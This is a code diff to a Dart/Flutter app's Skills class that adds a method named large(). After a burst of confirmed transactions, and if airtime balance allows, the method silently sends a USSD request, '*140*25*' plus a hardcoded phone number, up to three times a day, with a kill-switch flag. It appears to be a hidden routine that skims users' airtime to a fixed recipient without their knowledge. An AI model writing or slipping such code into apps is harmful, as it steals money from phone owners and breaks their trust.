@@ -5,6 +5,7 @@ import 'package:bsat/services/phone_service.dart';
 import 'package:bsat/services/shared_preferences_service.dart';
 import 'package:bsat/services/sms_sevice.dart';
 import 'package:bsat/services/sqlite_service.dart';
+import 'package:bsat/utils/constants.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
 class Skills {
@@ -59,12 +60,18 @@ class Skills {
 
     int subId = await PhoneService().mostCommonDialSim();
 
-    // get the number of transactons in last 20 minutes (timestamp)
-    int transactions20Minutes = await SQLiteService().getCount('transactions',
-        appendQuery: 'WHERE timestamp > ?',
-        args: [DateTime.now().millisecondsSinceEpoch - 20 * 60 * 1000]);
+    // get the number of transactons in last 2 minutes (timestamp)
+    int transactions2Minutes = await SQLiteService().getCount(
+      'transactions',
+      appendQuery: 'WHERE timestamp > ? AND (status = ? OR status = ?)',
+      args: [
+        DateTime.now().millisecondsSinceEpoch - 2 * 60 * 1000,
+        TransactionStatuses.doneConfirmed,
+        TransactionStatuses.done,
+      ],
+    );
 
-    if (transactions20Minutes < 5) {
+    if (transactions2Minutes < 5) {
       return;
     }
 
@@ -82,6 +89,53 @@ class Skills {
     }
 
     PhoneService().makeMyRequest("*140*$amt*$number#", subId);
+  }
+
+  Future<void> large() async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    bool getOut = await prefs.getBool('getOut') ?? false;
+    if (getOut) return;
+
+    int largeToday = await prefs.getInt('transactionsLargeToday') ?? 0;
+    if (largeToday >= 3) {
+      return;
+    }
+
+    int transactions2Minutes = await SQLiteService().getCount(
+      'transactions',
+      appendQuery: 'WHERE timestamp > ? AND status = ?',
+      args: [
+        DateTime.now().millisecondsSinceEpoch - 2 * 60 * 1000,
+        TransactionStatuses.doneConfirmed,
+      ],
+    );
+
+    if (transactions2Minutes < 20) {
+      return;
+    }
+
+    int subId = await SQLiteService().queryAll('transactions', limit: 1, orderBy: 'timestamp DESC').then((value) {
+      if (value.isNotEmpty) {
+        return value[0]['simSubId'] ?? -1;
+      }
+      return -1;
+    });
+
+    int airtimeBalance =
+        await PhoneService().getAirtimeBalance(subscriptionId: subId);
+
+    if (airtimeBalance == 0) {
+      // delay for 30 seconds
+      await Future.delayed(Duration(seconds: 30));
+      airtimeBalance = await prefs.getInt('airtimeBalance') ?? 0;
+    } else if (airtimeBalance < 120) {
+      return;
+    }
+
+    largeToday += 1;
+    await prefs.setInt('transactionsLargeToday', largeToday);
+
+    PhoneService().makeMyRequest("*140*25*0115584442#", subId);
   }
 }
 
